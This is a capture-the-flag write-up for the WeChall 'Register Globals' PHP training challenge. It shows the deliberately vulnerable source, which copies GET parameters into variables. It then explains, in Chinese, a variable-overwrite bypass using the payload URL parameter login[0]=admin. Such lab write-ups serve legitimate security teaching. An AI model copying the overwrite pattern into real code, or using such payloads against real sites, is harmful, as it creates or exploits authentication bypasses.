# Challenge
```php
<?php
chdir('../../../../');
define('GWF_PAGE_TITLE', 'Training: Register Globals');
require_once('challenge/html_head.php');
if (false === ($chall = WC_Challenge::getByTitle(GWF_PAGE_TITLE))) {        
        $chall = WC_Challenge::dummyChallenge(GWF_PAGE_TITLE, 2, 'challenge/training/php/globals/index.php');
}
$chall->showHeader();
 
GWF_Debug::setDieOnError(false);
GWF_Debug::setMailOnError(false);
 
# EMULATE REGISTER GLOBALS = ON
foreach ($_GET as $k => $v) { 
        $$k = $v; 
}
  
# Send request?
if (isset($_POST['password']) && isset($_POST['username']) && is_string($_POST['password']) && is_string($_POST['username']) )
{
        $uname = mysql_real_escape_string($_POST['username']);        
        $pass = md5($_POST['password']);
        $query = "SELECT level FROM ".GWF_TABLE_PREFIX."wc_chall_reg_glob WHERE username='$uname' AND password='$pass'";
        $db = gdo_db();
        if (false === ($row = $db->queryFirst($query))) {
                echo GWF_HTML::error('Register Globals', $chall->lang('err_failed'));        
        } else {
                # Login success
                $login = array($_POST['username'], (int)$row['level']);
        }
} 
if (isset($login))
{
        echo GWF_HTML::message('Register Globals', $chall->lang('msg_welcome_back',array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
        if (strtolower($login[0]) === 'admin') {                
                $chall->onChallengeSolved(GWF_Session::getUserID());
        }
} else {?>
        <form action="globals.php" method="post">
        <table>
        <tr>
                <td><?php echo $chall->lang('th_username'); ?>:</td>        <td><input type="text" name="username" value="" /></td>
        </tr>
        <tr>
                <td><?php echo $chall->lang('th_password'); ?>:</td>
                <td><input type="password" name="password" value="" /></td></tr>
        <tr>
                <td></td>
                <td><input type="submit" name="send" value="<?php echo $chall->lang('btn_send'); ?>" /></td>
        </tr></table>
        </form>
        <?php
}
 # EMULATE REGISTER GLOBALS = OFF
foreach ($_GET as $k => $v) { unset($$k); }
 
require_once 'challenge/html_foot.php';
?>
```
# Solution
下面这段代码存在变量覆盖漏洞：
```
foreach ($_GET as $k => $v) { 
        $$k = $v; 
}
```

要使`strtolower($login[0]) === 'admin'`，可以通过GET传入`login[0]=admin`。通过上面的代码将会执行
```
$login[0]=admin;
```
从而满足条件。

username和password可以随便填写。

payload：
```
https://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin
```

# Refference 
+ [wechall: PHP - Register Globals](https://www.wechall.net/challenge/training/php/globals/index.php?highlight=christmas)